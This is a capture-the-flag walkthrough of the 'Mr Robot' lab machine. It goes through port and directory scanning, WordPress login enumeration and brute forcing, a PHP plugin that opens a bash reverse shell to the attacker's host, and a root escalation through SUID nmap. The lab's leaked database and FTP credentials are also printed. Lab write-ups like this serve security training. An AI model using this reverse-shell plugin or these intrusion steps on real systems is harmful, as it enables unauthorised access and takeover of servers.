Mr Robot CTF Walkthrough

 "They showed themselves, the top 1% of the 1%, the ones in control, the ones who play God without permission. And now I'm gonna take them down."

Initial Nmap Scan:

nmap -sV -T4 [machine IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-17 13:41 EST
Nmap scan report for 10.10.254.18
Host is up (0.15s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  closed http
443/tcp open   ssl/http Apache httpd

Head over to the webpage at http://[machine IP] and check out all of the options presented to you.

Make note, when viewing the source of the page, we discover it is running wordpress.

Gobuster Scan using the Dirb common wordlist (if you do not have it on your machine, 
you can get it here: https://github.com/v0re/dirb/blob/master/wordlists/common.txt)

gobuster -u http://[machine IP] -w dirbcommon.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[machine IP]
[+] Threads      : 10
[+] Wordlist     : dirbcommon.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/01/17 14:04:37 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/admin (Status: 301)
/atom (Status: 301)
/audio (Status: 301)
/blog (Status: 301)
/css (Status: 301)
/dashboard (Status: 302)
/favicon.ico (Status: 200)
/feed (Status: 301)
/image (Status: 301)
/Image (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.php (Status: 301)
/intro (Status: 200)
/js (Status: 301)
/license (Status: 200)
/login (Status: 302)
/page1 (Status: 301)
/phpmyadmin (Status: 403)
/rdf (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/sitemap (Status: 200)
/sitemap.xml (Status: 200)
/video (Status: 301)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-config (Status: 200)
/wp-cron (Status: 200)
/wp-includes (Status: 301)
/wp-load (Status: 200)
/wp-links-opml (Status: 200)
/wp-login (Status: 200)
/wp-signup (Status: 302)


Visit /robots.txt, and we find the way to the first key at /key-1-of-3.txt
Grab the fsociety.dic file as well. Open it, and we get what appears to be a wordlist.

The only other page that appears worthwhile is the login page. When trying different usernames, we are met with some ERROR: Invalid Username 
prompts that we can use to enumerate the correct username. 
Using this method with various names from Mr. Robot, we eventually discover that
"Elliot" works, by telling us that the password for user Elliot is incorrect. 

Next, using the wordlist fsociety.dic, let's fire up WPScan to bruteforce the password.

You may want to clean up the wordlist first and get rid of duplicates for time's sake.
sort -u fsocity.dic > fsocity2.dic 

wpscan --url http://[machine IP]/wp-login -U elliot -P /path/to/fsocity2.dic -t 50

After some time, we discover the password is "ER28-0652".

Looking around the dashboard for potential vulnerabilities, I decided to try making a reverse shell plugin.
I found this site which has a great script:
https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/[your IP]/[port] 0>&1'");
?>

Compress the file into a .zip, and go to "Plugins > Add New"

Start a reverse listener on your machine:
nc -lvnp [port]

Once uploaded, activate the plugin and catch the shell.

In the wp-config.php file, we find some interesting credentials for MySQL and FTP:

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'bitnami_wordpress');

/** MySQL database username */
define('DB_USER', 'bn_wordpress');

/** MySQL database password */
define('DB_PASSWORD', '570fd42948');


define('FTP_USER', 'bitnamiftp');
define('FTP_PASS', 'inevoL7eAlBeD2b5WszPbZ2gJ971tJZtP0j86NYPyh6Wfz1x8a');

We'll save this incase they're needed. 

Checking out /home/, we see one user whose name is "robot".
Key-2-of-3 is in there, but we get a permission denied when we try and read it.
There is one more file in this user's folder, which is password.raw-md5. Opening it reveals:
robot:c3fcd3d76192e4007dfb496cca67e13b

Put the hash into crackstation, and we get the password:
abcdefghijklmnopqrstuvwxyz

If we try and log in immediately with su robot, we are met with
su: must be run from a terminal

So first, spawn a TTY shell with:
python -c 'import pty; pty.spawn("/bin/sh")'

Then, try su robot again
(password at the prompt)

Grab key 2 of 3 in /home/robot/

Next, we should elevate our permissions and try and obtain root.

Trying sudo -l only tells us we don'y have permission to run sudo.

What about files with SUID set?

find / -type f -perm -04000 -ls 2>/dev/null
 15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount
 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount
 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su
 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd
 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp
 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh
 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn
 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd
 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo
 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap
 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign
 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown

nmap seems to be the only option.

Go to gtfobins, and follow the directions under "shell (option b):

Run:
nmap --interactive
!whoami
(should say root)
!sh

Now, go grab the last key in /root/!!
